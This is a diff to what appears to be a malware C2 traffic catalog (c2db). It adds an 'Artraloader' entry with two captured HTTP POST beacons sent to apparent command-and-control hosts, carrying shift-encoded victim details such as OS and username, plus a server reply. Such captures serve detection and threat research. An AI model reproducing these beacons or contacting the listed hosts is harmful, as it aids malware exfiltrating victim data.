@@ -63,6 +63,33 @@ Connection: close
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/arechclient2.png "Arechclient2")
 
+#### Artraloader
+~~~
+POST /kvs06v.php HTTP/1.0
+Host: onlinejohnline99.org
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-length: 97
+
+SNI=VTFS.QD&UME=Xjoepxt!8!Qspgfttjpobm&OPQ=benjo&IVR=VTFS.QD$$benjoAA11482.572.3314613.96675&st=0
+
+HTTP/1.0 200 OK
+Content-Type: text/html
+Content-Length: 0
+Date: Mon, 26 Aug 2019 21:33:28 GMT
+Server: LiteSpeed
+Connection: close
+
+POST /Engset.php HTTP/1.0
+Host: hewle.kielsoservice.net
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-length: 126
+
+BCDEF=EFTLUPQ.KHMMKME&MNOPQ=Xjoepxt!21!Qsp&GHIJ=benjo&UVWXYZ=EFTLUPQ.KHMMKME$$benjoAAcc:37f65.f4db.51ge.bf:1.3875452f88:3&st=0
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/artra.png "Artraloader")
+
 #### Azorult
 POST retrieve metod, unique pattern with lot's of '/' and ')'
 ~~~
